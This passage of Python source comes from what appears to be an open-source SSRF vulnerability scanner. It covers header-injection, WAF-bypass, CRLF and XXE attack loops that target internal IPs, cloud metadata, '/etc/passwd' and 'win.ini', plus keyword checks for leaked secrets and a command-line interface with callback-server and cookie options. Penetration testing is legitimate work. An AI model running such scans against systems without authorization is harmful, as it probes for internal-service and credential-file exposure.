                    data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                        if method in ['POST', 'PUT', 'PATCH'] else None
                    result = self.perform_attack(
                        url, f'DNS Rebinding ({method})', payload, bad_header,
                        original_response, method=method, data=data_payload)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def waf_bypass_attack(self, url, original_response):
        """Tests for SSRF using WAF bypass techniques."""
        total_tests = len(self.headers) * len(self.waf_bypass_payloads) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for payload in self.waf_bypass_payloads:
                for method in self.methods_to_test:
                    completed_tests += 1
                    self.update_progress('WAF Bypass', completed_tests, total_tests)
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    bad_header = {header: header_value}
                    data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                        if method in ['POST', 'PUT', 'PATCH'] else None
                    result = self.perform_attack(
                        url, f'WAF Bypass ({method})', payload, bad_header,
                        original_response, method=method, data=data_payload)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def crlf_injection_attack(self, url, original_response):
        """Tests for SSRF by injecting CRLF sequences into headers."""
        target_hosts = self.local_ips[:5] + self.cloud_metadata[:2]
        if self.backurl:
            target_hosts.append(self.backurl)

        total_tests = len(self.headers) * len(self.crlf_payloads) * len(target_hosts)
        completed_tests = 0

        for header in self.headers:
            for crlf_template in self.crlf_payloads:
                for host in target_hosts:
                    completed_tests += 1
                    self.update_progress('CRLF Injection', completed_tests, total_tests)
                    payload = crlf_template.replace('{host}', host)
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    bad_header = {header: header_value}
                    result = self.perform_attack(
                        url, 'CRLF Injection', payload, bad_header, original_response)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def xxe_attack(self, url, original_response):
        """Tests for SSRF via XXE injection."""
        target_payloads = self.local_ips[:2] + ['/etc/passwd', 'c:/windows/win.ini']
        if self.backurl:
            target_payloads.append(self.backurl)

        total_tests = len(self.xxe_payloads) * len(target_payloads) * 2  # For POST and PUT
        completed_tests = 0

        for xxe_template in self.xxe_payloads:
            for target in target_payloads:
                for method in ['POST', 'PUT']:
                    completed_tests += 1
                    self.update_progress('XXE', completed_tests, total_tests)
                    xml_payload = xxe_template.replace('{payload}', target)
                    headers = {'Content-Type': 'application/xml'}
                    result = self.perform_attack(
                        url, f'XXE ({method})', xml_payload, headers,
                        original_response, method=method, data=xml_payload)
                    if result and result.is_vulnerable:
                        self.log_vulnerability(result)

    def verify_vulnerability(self, _url: str, _payload: str, response) -> str:
        """Verifies a potential vulnerability based on a set of checks."""
        verification_methods = [
            self._verify_response_code,
            self._verify_response_content,
            self._verify_response_headers,
            self._verify_timing_difference
        ]
        for method in verification_methods:
            if method(response):
                return method.__name__.replace('_verify_', '').replace('_', ' ').title()
        return "Unverified"

    def _verify_response_code(self, response) -> bool:
        """Verify based on response status code."""
        return response.status_code in [200, 301, 302, 307]

    def _verify_response_content(self, response) -> bool:
        """Verify based on keywords in response content."""
        indicators = [
            'root:',
            'admin:',
            'internal',
            'password',
            'key',
            'uid=',
            'metadata',
            'aws',
            'secret'
        ]
        return any(indicator in response.text.lower() for indicator in indicators)

    def _verify_response_headers(self, response) -> bool:
        """Verify based on presence of internal-looking response headers."""
        suspicious_headers = [
            'x-internal',
            'server-internal',
            'x-backend-server',
            'x-upstream',
            'x-host',
            'x-forwarded-server'
        ]
        return any(header.lower() in response.headers for header in suspicious_headers)

    def _verify_timing_difference(self, response) -> bool:
        """Verify based on a significant timing difference in response."""
        return response.elapsed.total_seconds() > 2.0

    def log_vulnerability(self, result: ScanResult):
        """Logs a found vulnerability to the console."""
        with self.lock:
            self.logger.warning("\nPotential SSRF vulnerability found!")
            self.logger.warning("URL: %s", result.url)
            self.logger.warning("Attack Type: %s", result.attack_type)
            self.logger.warning("Payload: %s", result.payload)
            self.logger.warning("Response Code: %s", result.response_code)
            self.logger.warning("Verification Method: %s", result.verification_method)
            self.logger.warning("-" * 50)

    def perform_all_attacks(self, url):
        """Runs all configured attack types against a single URL."""
        original_response = self.make_request(url)
        if original_response:
            self.progress.current_phase = "Local IP"
            self.local_attack(url, original_response)
            self.progress.current_phase = "Cloud Metadata"
            self.cloud_metadata_attack(url, original_response)
            self.progress.current_phase = "Protocol"
            self.protocol_attack(url, original_response)
            self.progress.current_phase = "Encoded"
            self.encoded_attack(url, original_response)
            self.progress.current_phase = "Parameter"
            self.parameter_attack(url, original_response)
            self.progress.current_phase = "Port Scan"
            self.port_scan_attack(url, original_response)
            self.progress.current_phase = "DNS Rebinding"
            self.dns_rebinding_attack(url, original_response)
            self.progress.current_phase = "WAF Bypass"
            self.waf_bypass_attack(url, original_response)
            self.progress.current_phase = "CRLF Injection"
            self.crlf_injection_attack(url, original_response)
            self.progress.current_phase = "XXE"
            self.xxe_attack(url, original_response)
        else:
            with self.lock:
                self.error_urls += 1
                if self.config.scanner['debug']:
                    print(Fore.RED + f"Connection error with url: {url}")

    def scan_urls(self):
        """Worker function for threads to pull URLs from the queue and scan them."""
        while True:
            try:
                url = self.q.get_nowait()
            except queue.Empty:
                break
            self.urls_analyzed += 1
            self.print_progress()
            self.perform_all_attacks(url)
            self.q.task_done()

    def run(self, urls=None, url_file=None):
        """Main entry point to start the scanner."""
        try:
            if urls:
                for url in urls:
                    if url:
                        self.q.put(url)
                        self.total_urls_to_scan += 1
            elif url_file:
                with open(url_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        url = line.strip()
                        if url:
                            self.q.put(url)
                            self.total_urls_to_scan += 1
            if self.q.empty():
                self.logger.error("No valid URLs to scan. Please provide a URL with -u or a file with -f.")
                return

            threads = []
            for _ in range(self.config.scanner['threads']):
                t = Thread(target=self.scan_urls)
                t.daemon = True
                t.start()
                threads.append(t)
            self.q.join()
            summary = self.reporter.generate_summary(
                urls_analyzed=self.urls_analyzed,
                error_urls=self.error_urls
            )
            print(summary)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Scan interrupted by user (Ctrl+C)")
            summary = self.reporter.generate_summary(
                urls_analyzed=self.urls_analyzed,
                error_urls=self.error_urls
            )
            print(summary)
            sys.exit(1)


def print_banner():
    """Prints the application banner."""
    print("""
            ░██████╗░██████╗██████╗░███████╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝
            ╚█████╗░╚█████╗░██████╔╝█████╗░░
            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
            ██████╔╝██████╔╝██║░░██║██║░░░░░
            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    """)
    print(__version__ + " by RuslanSemchenko")
    print(Fore.YELLOW + "[WRN] Use with caution. You are responsible for your actions.")
    print(Fore.YELLOW + "[WRN] Developers assume no liability and are not responsible for any misuse or damage.")

def main():
    """Main function to parse arguments and run the scanner."""
    parser = argparse.ArgumentParser(
        description="SSRF-Scanner: An automated tool to find potential SSRF issues.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
Examples:
  python3 {sys.argv[0]} -u https://example.com
  python3 {sys.argv[0]} -u https://example.com -b http://your_callback_server
  python3 {sys.argv[0]} -f urls.txt -t 20
  python3 {sys.argv[0]} -u https://example.com -c "session=abc123def456" --debug
"""
    )

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-u", "--url", help="A single URL to scan.")
    target_group.add_argument(
        "-f", "--file", help="File containing a list of URLs to scan."
    )

    parser.add_argument(
        "-b", "--backurl", help="Callback URL for out-of-band SSRF detection."
    )
    parser.add_argument(
        "-c", "--cookie", help="Cookie to use for requests (e.g., 'name1=value1; name2=value2')."
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)."
    )
    parser.add_argument(
        "--timeout", type=int, default=3, help="Request timeout in seconds (default: 3)."
    )
    parser.add_argument(
        "-d", "--debug", action="store_true", help="Enable debug mode for verbose output."
    )
    parser.add_argument('--version', action='version', version=f'%(prog)s {__version__}')

    args = parser.parse_args()

    config = Config()
    config.scanner['debug'] = args.debug
    config.scanner['threads'] = args.threads
    config.scanner['timeout'] = args.timeout

    scanner = SSRFScanner(config)
    scanner.backurl = args.backurl
    scanner.cookies = args.cookie

    scanner.run(urls=[args.url] if args.url else None, url_file=args.file)

if __name__ == "__main__":
    main()
